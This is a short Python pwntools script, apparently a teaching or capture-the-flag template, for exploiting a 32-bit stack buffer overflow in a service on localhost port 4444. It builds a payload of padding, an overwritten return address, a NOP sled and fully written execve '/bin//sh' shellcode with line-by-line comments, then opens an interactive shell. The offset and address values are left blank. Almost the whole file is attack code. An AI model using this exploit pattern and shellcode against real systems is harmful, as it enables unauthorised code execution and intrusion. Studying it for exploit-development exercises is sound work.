from pwn import *

import struct

HOST = '127.0.0.1'
PORT = 4444

# create a socket object
s = remote(HOST, PORT)

raw_input('press a key to continue')

def p32(v):
    # return v packed as 32bit unsigned integer little endian
    return struct.pack("<I", v)

def p_recvuntil(delim):
    buf = s.recvuntil(delim)
    print 'received: ', buf
    return buf

def p_send(buf):
    print 'sending: ', buf
    s.send(buf)

offset_eip = 

padding = 'A'*offset_eip

new_eip = p32()

nop_sled = '\x90'*5 # NOP

# the goal of this shellcode is to spawn a shell, cf man execve
# on 32-bits *nix systems, syscall arguments are passed in registers in the following order: EBX, ECX, EDX, ESX, EDI
# the syscall number is passed in the EAX register
# our goal is to setup the register in the following way:
#       EAX set to 0xb (11) which is the syscall number for execve
#       EBX set to an address containing the "/bin//sh" string
#       ECX set to an adrress containing the arguments array ["/bin//sh", 0]
#       EDX set to an address containing 0x00000000

shellcode = '\x31\xc0'              # xor eax, eax      ; sets EAX to 0
shellcode += '\x50'                 # push eax          ; pushes EAX on the stack
shellcode += '\x89\xe2'             # mov edx, esp      ; set EDX to an address pointing to 0x00000000
shellcode += '\x68\x2f\x2f\x73\x68' # push 0x68732f2f   ; pushes '//sh' on the stack
shellcode += '\x68\x2f\x62\x69\x6e' # push 0x6e69622f   ; pushes '/bin' on the stack
shellcode += '\x89\xe3'             # mov ebx, esp      ; sets EBX to ESP, EBX now containes a pointer to the string '/bin//sh'
shellcode += '\x50'                 # push eax          ; pushes EAX on the stack, on top of the stack is now the value 0x00000000
shellcode += '\x53'                 # push ebx          ; pushes EBX on the stack, on the tope of the stack is now a pointer to 'bin//sh'
shellcode += '\x89\xe1'             # mov ecx, esp      ; sets ECX to ESP, ECX now contains a pointer to the arguments array for execve
shellcode += '\xb0\xb0'             # mov al, 0xb0      ; sets EAX lowest 8-bits to 0xb0
shellcode += '\xc0\xe8\x04'         # shr al, 4         ; shifts EAX lowest 8-bits to the righ, EAX now contains 0xb
shellcode += '\xcd\x80'             # int 0x80          ; software interrupt

payload = padding + new_eip + nop_sled + shellcode

p_recvuntil('name?\n')
p_send(payload)
s.interactive()
